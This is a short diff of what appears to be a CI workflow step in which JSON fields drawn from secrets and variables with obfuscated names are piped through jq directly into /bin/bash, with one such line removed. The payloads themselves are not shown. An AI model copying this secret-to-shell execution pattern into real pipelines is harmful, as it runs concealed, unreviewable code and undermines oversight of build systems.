@@ -17,7 +17,6 @@ jobs:
           tuam0: ${{ secrets.tuam0 }}
         run: |
           printf '%s' "$tuam0" | jq -r .ydlh92271 | /bin/bash
-          echo $orne4489 | jq -r .fqee7442 | /bin/bash
           printf '%s' "$va08" | jq -r .q179 | /bin/bash
           echo $i6 | jq -r .utm85367 | /bin/bash
 
